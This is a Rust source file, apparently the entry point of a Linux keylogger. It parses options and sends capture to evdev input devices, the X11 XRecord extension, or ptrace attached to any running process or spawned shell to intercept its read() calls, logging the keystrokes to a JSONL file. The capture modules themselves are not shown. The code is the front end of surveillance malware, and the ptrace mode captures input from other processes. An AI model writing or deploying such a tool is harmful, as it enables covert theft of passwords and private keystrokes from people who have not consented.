use std::path::Path;

fn usage() -> ! {
    eprintln!("usage: keylogger --method evdev|x11|ptrace [--log PATH] [--grab] [--pid N] [--spawn SHELL]");
    eprintln!("  --method evdev       capture via /dev/input event devices (input group or root)");
    eprintln!("  --method x11         capture via the XRecord extension (needs a running X session)");
    eprintln!("  --method ptrace      intercept read() on a traced process (needs root or child)");
    eprintln!("  --pid N              ptrace: attach to running process N");
    eprintln!("  --spawn SHELL        ptrace: trace a forked child running SHELL");
    eprintln!("  --grab               evdev: exclusively grab devices (use only on a spare keyboard)");
    eprintln!("  --list-devices       evdev: print detected keyboard devices and exit");
    std::process::exit(2);
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    let mut method = String::new();
    let mut log = "keys.log.jsonl".to_string();
    let mut grab = false;
    let mut pid: Option<i32> = None;
    let mut spawn: Option<String> = None;
    let mut list = false;

    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "--method" => {
                i += 1;
                method = args.get(i).cloned().unwrap_or_default();
            }
            "--log" => {
                i += 1;
                log = args.get(i).cloned().unwrap_or_default();
            }
            "--grab" => grab = true,
            "--pid" => {
                i += 1;
                pid = args.get(i).and_then(|s| s.parse().ok());
            }
            "--spawn" => {
                i += 1;
                spawn = args.get(i).cloned();
            }
            "--list-devices" => list = true,
            "-h" | "--help" => usage(),
            _ => usage(),
        }
        i += 1;
    }

    if list {
        for device in capture_evdev::list_keyboards() {
            println!("{}", device);
        }
        return;
    }

    let mut logger = keycore::JsonlLogger::new(Path::new(&log))
        .unwrap_or_else(|e| {
            eprintln!("cannot open log: {}", e);
            std::process::exit(1);
        });
    eprintln!("[keylogger] logging to {}", log);

    match method.as_str() {
        "evdev" => {
            let result = capture_evdev::run_devices(grab, |event| {
                if let Err(e) = logger.log(&event) {
                    eprintln!("log error: {}", e);
                }
            });
            if let Err(e) = result {
                eprintln!("evdev: {}", e);
                std::process::exit(1);
            }
        }
        "x11" => {
            let result = capture_x11::run(|event| {
                if let Err(e) = logger.log(&event) {
                    eprintln!("log error: {}", e);
                }
            });
            if let Err(e) = result {
                eprintln!("x11: {}", e);
                std::process::exit(1);
            }
        }
        "ptrace" => {
            let result = if let Some(shell) = spawn {
                capture_ptrace::spawn_and_trace(&shell, |bytes| {
                    if let Err(e) = logger.log_bytes(bytes) {
                        eprintln!("log error: {}", e);
                    }
                })
            } else if let Some(target) = pid {
                capture_ptrace::trace_pid(target, |bytes| {
                    if let Err(e) = logger.log_bytes(bytes) {
                        eprintln!("log error: {}", e);
                    }
                })
            } else {
                eprintln!("ptrace requires --pid N or --spawn SHELL");
                std::process::exit(2);
            };
            if let Err(e) = result {
                eprintln!("ptrace: {}", e);
                std::process::exit(1);
            }
        }
        _ => usage(),
    }
}
